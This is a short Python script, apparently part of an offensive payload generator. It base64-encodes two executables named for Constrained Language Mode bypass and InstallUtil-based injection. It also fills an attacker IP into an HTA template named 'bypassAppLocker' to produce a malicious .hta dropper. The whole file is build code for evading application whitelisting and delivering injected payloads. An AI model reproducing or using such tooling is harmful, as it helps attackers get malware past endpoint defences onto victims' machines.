import multiprocessing
import random
import string
import subprocess
import base64

def generate_hta(ip,shellcode,addition):
    exe2base64()
    t1(ip)



def exe2base64():
    with open("out/exe/BypassCLM_ps_inject.exe","rb") as f:
        exe_content = f.read()
    exe_base64 = base64.b64encode(exe_content).strip()
    with open("out/other/b64.txt","wb") as f:
        f.write(exe_base64)
    with open("out/exe/InstallUtils_Inject.exe","rb") as f:
        exe_content = f.read()
    exe_base64 = base64.b64encode(exe_content).strip()
    with open("out/other/c64.txt","wb") as f:
        f.write(exe_base64)

def t1(ip):
    with open("data/hta/bypassAppLocker.txt","r") as f:
        content = f.read()
    content = content.format(ip=ip)
    with open("out/other/bypassAppLocker.hta","w") as f:
        f.write(content)